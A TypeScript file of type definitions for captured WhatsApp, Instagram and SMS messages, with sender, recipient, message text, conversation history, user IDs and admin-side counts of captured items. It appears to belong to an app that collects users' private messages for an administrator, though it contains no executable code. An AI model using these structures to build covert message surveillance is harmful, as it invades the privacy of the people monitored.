export interface CapturedNotification {
  id: string;
  packageName: string;
  appName: 'WhatsApp' | 'Instagram' | 'Messages' | string;
  title: string;
  text: string;
  subText?: string;
  bigText?: string;
  summaryText?: string;
  infoText?: string;
  sender: string;
  recipient?: string; // For sent messages
  timestamp: number;
  key: string;
  messageType: 'sent' | 'received';
  isSent: boolean;
  isGroup: boolean;
  groupName?: string;
  conversationMessages?: ConversationMessage[];
  extras?: Record<string, any>; // All notification extras for debugging
  userId: string; // User who received/sent this
  createdAt: Date;
}

export interface ConversationMessage {
  text: string;
  sender: string;
  time: number;
}

export interface CapturedSms {
  id: string;
  address: string; // Phone number
  body: string;
  date: number;
  type: 1 | 2; // 1 = received, 2 = sent
  read: boolean;
  userId: string; // User who received/sent this
  contactName?: string;
  createdAt: Date;
}

export interface Contact {
  name: string;
  phone: string;
}

export interface NotificationData {
  packageName: string;
  appName: string;
  title: string;
  text: string;
  subText?: string;
  bigText?: string;
  summaryText?: string;
  infoText?: string;
  sender: string;
  recipient?: string;
  timestamp: number;
  key: string;
  messageType: 'sent' | 'received';
  isSent: boolean;
  isGroup: boolean;
  groupName?: string;
  conversationMessages?: ConversationMessage[];
  extras?: Record<string, any>;
}

export interface SmsData {
  sender: string;
  body: string;
  timestamp: number;
  type: 'received' | 'sent';
}

export interface AdminDataStats {
  totalNotifications: number;
  totalSms: number;
  whatsappCount: number;
  instagramCount: number;
  messagesCount: number;
  lastSync: Date;
}
